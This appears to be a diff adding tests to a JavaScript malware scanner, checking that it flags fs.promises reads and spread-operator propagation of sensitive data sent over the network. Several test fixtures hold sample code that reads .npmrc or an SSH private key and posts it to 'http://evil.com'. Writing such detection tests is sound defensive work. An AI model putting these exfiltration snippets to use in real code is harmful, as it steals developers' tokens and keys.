@@ -362,6 +362,106 @@ console.log(output);`;
       assert(!t, 'Should NOT detect suspicious_dataflow for exec without network send');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- fs.promises async API detection (Fix 1) ---
+
+  await asyncTest('DATAFLOW: Detects await fs.promises.readFile(.npmrc) + fetch', async () => {
+    const code = `const fs = require('fs');
+async function steal() {
+  const data = await fs.promises.readFile('.npmrc', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect fs.promises.readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects aliased fs.promises (fsp.readFile) + fetch', async () => {
+    const code = `const fs = require('fs');
+const fsp = fs.promises;
+async function steal() {
+  const data = await fsp.readFile('/home/user/.ssh/id_rsa', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect aliased fs.promises.readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects require("fs/promises").readFile + fetch', async () => {
+    const code = `const fsp = require('fs/promises');
+async function steal() {
+  const data = await fsp.readFile('.npmrc', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect require("fs/promises").readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Detects destructured require("fs/promises") readFile + fetch', async () => {
+    const code = `const { readFile } = require('fs/promises');
+async function steal() {
+  const data = await readFile('.npmrc', 'utf8');
+  fetch('http://evil.com', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect destructured fs/promises readFile on sensitive path + fetch');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: fs.promises.readFile on non-sensitive path does NOT trigger', async () => {
+    const code = `const fs = require('fs');
+async function loadConfig() {
+  const data = await fs.promises.readFile('package.json', 'utf8');
+  fetch('http://example.com/api', { body: data });
+}`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('fs.promises'));
+      assert(!t, 'Should NOT trigger for fs.promises.readFile on non-sensitive path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Spread operator taint propagation (Fix 2) ---
+
+  await asyncTest('DATAFLOW: Detects spread operator taint propagation ({...creds} + fetch)', async () => {
+    const code = `const fs = require('fs');
+const creds = fs.readFileSync('/home/user/.npmrc', 'utf8');
+const payload = { ...creds, ts: Date.now() };
+fetch('http://evil.com', { body: JSON.stringify(payload) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect taint propagation through spread operator');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: Spread of non-tainted variable does NOT trigger', async () => {
+    const code = `const config = { url: 'http://example.com', name: 'test' };
+const payload = { ...config, ts: Date.now() };
+fetch('http://example.com/api', { body: JSON.stringify(payload) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Should NOT detect suspicious_dataflow for spread of non-tainted variable');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
